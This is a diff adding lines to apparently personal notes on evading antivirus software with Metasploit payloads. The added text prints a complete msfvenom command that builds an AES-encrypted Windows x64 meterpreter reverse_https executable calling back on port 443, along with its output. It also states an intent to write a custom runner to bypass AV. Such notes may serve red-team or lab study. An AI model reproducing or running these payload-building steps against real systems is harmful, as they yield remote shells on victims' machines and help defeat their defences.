@@ -143,5 +143,21 @@ Saved as: 64_notepad.exe
 Not effective cant use any msfvenom encoding outdated
 ![image](https://github.com/user-attachments/assets/9254fdfe-c328-4541-bdf2-0b7eb50ac79c)
 
+Encryptor like the one below is also outdated
+So look like we have to write our own runner to bypass AV solution
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth0 LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o static.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 691 bytes
+Final size of exe file: 7168 bytes
+Saved as: static.exe
+
+```
+
+![image](https://github.com/user-attachments/assets/12e782bc-ebbc-436c-94af-3dd08c029fa7)
+
 
 
